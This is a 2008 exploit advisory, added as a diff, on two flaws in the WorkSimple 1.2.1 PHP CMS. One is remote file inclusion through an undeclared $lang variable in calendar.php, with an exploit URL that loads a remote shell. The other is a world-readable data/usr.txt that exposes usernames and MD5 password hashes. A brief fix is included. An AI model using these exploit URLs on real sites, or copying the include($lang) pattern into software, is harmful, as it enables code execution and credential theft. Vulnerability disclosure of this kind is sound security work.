@@ -1,0 +1,49 @@
+[START]
+
+#########################################################################################
+[0x01] Informations:
+
+Script         : WorkSimple 1.2.1
+Download       : http://www.hotscripts.com/jump.php?listing_id=85112&jump_type=1
+Vulnerability  : Remote File Inclusion / Sensitive Data Disclosure
+Author         : Osirys
+Contact        : osirys[at]live[dot]it
+Notes          : Proud to be Italian
+Greets:        : XaDoS, x0r, emgent, Jay
+
+
+#########################################################################################
+[0x02] Bug:[Remote File Inclusion]
+######
+
+Bugged file is: /[path]/calendar.php
+
+[CODE]
+<?PHP require 'data/conf.php'; //Include the global config ?>
+	<?php include("$lang") ?>
+[/CODE]
+
+$lang variable is not declared, I thought it was declared on conf.php, but it's not.
+So we can set the $lang value directly from GET.
+
+FIX : Just declare $lang, for example in /[path]/data/conf.php
+
+
+[!] EXPLOIT: /[path]/calendar.php?lang=[remote_txt_shell]
+
+########################################################################################
+[0x03] Bug:[Sensitive Data Disclosure]
+######
+
+In this cms, when an user register himself, the cms puts informations like username and
+password on a .txt file. So, just going on it, we can get sensitive data like username
+and passoword. username:md5_hash
+
+
+[!] EXPLOIT: /[path]/data/usr.txt
+
+#########################################################################################
+
+[/END]
+
+# milw0rm.com [2008-12-15]
